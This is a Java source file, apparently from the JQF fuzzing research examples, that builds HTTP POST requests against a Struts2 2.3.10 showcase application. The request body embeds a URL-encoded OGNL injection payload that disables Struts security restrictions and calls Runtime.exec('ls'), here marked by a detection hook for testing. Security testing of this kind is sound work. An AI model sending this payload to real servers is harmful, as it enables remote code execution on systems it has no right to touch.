package edu.berkeley.cs.jqf.examples.http;

import com.pholser.junit.quickcheck.generator.GenerationStatus;
import com.pholser.junit.quickcheck.generator.Generator;
import com.pholser.junit.quickcheck.random.SourceOfRandomness;
import edu.berkeley.cs.jqf.examples.common.DictionaryBackedStringGenerator;
import org.apache.http.Header;
import org.apache.http.client.methods.HttpUriRequest;
import org.apache.http.client.methods.RequestBuilder;

import java.io.IOException;


public class StrutsRequestGenerator extends HTTPRequestGenerator {

    private final String bodyOGNLInjectionString = "%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%40edu.berkeley.cs.jqf.examples.tomcat.OGNLInjection%40setInjectionDetected%28true%29%29.%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27ls%27%29%29%7D";

    //private  Generator<String> validBodyValues;
    private Generator<String> validUrlGenerator;


    public StrutsRequestGenerator() {
        super();
        try {
            this.validUrlGenerator =  new DictionaryBackedStringGenerator("dictionaries/struts-showcase-validUrls.dict", stringGenerator);
           // this.validBodyValues = new DictionaryBackedStringGenerator("dictionaries/tomcat-http-request.dict", stringGenerator);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }


    @Override
    public String generate(SourceOfRandomness random, GenerationStatus status) {
        RequestBuilder builder = getReqType(random, status);
        getHeaders(builder,random,status);

        // getParameters(builder,random,status);
        HttpUriRequest req =  builder.build();
        String request = req.toString() + "\r\n";


        request += ("Host: any\r\n" +
                    "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0\r\n" +
                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n" +
                    "Accept-Language: en-US,en;q=0.5\r\n" +
                    "Accept-Encoding: gzip, deflate\r\n" +
                    "Referer: http://localhost:8080/struts2-showcase-2_3_10/integration/editGangster\r\n" +
                    "Content-Type: application/x-www-form-urlencoded\r\n" +
                    "Content-Length: 708\r\n" +
                    "Connection: keep-alive\r\n" +
                    "Cookie: JSESSIONID=355085EC5421F19AF97B123A53841DF7\r\n" +
                    "Upgrade-Insecure-Requests: 1\r\n\r\n");

        request += getBody();

        return request;
    }

    @Override
    protected String getBody() {

        return "name=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%40edu.berkeley.cs.jqf.examples.tomcat.OGNLInjection%40setInjectionDetected%28true%29%29.%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27ls%27%29%29%7D&age=33&bustedBefore=true&__checkbox_bustedBefore=true&description=\r\n\r\n";
    }


    @Override
    protected RequestBuilder getReqType(SourceOfRandomness random, GenerationStatus status) {
        //return RequestBuilder.post(this.validUrlGenerator.generate(random, status));

         return RequestBuilder.post("/struts2-showcase-2_3_10/integration/saveGangster.action");
//        int index = random.nextInt(5);
//        switch(index) {
//            case 0:
//                return RequestBuilder.get(this.validUrlGenerator.generate(random, status));
//            case 1:
//                return RequestBuilder.post(this.validUrlGenerator.generate(random, status));
//            case 2:
//                return RequestBuilder.head(this.validUrlGenerator.generate(random, status));
//            case 3:
//                return RequestBuilder.delete(this.validUrlGenerator.generate(random, status));
//            case 4:
//                return RequestBuilder.trace(this.validUrlGenerator.generate(random, status));
//            // shouldn't get here
//            default:
//                return null;
//        }
    }
}
